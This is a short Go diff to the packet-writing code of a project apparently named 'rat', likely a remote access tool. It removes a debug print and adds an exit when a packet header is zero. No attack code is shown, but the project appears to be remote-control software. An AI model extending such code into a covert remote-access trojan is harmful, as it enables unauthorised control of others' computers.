@@ -4,6 +4,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"net"
+	"os"
 	"rat/common"
 	"rat/network"
 )
@@ -40,7 +41,11 @@ func (c *Connection) WriteHeader(header common.PacketHeader) error {
 
 func (c *Connection) WritePacket(packet OutgoingPacket) error {
 	err := c.WriteHeader(packet.Header())
-	fmt.Println("Wrote header", packet.Header())
+
+	if packet.Header() == 0 {
+		os.Exit(0)
+	}
+
 	if packet.Header() == common.ComputerInfoHeader {
 		fmt.Println("Outside init()", packet)
 	}
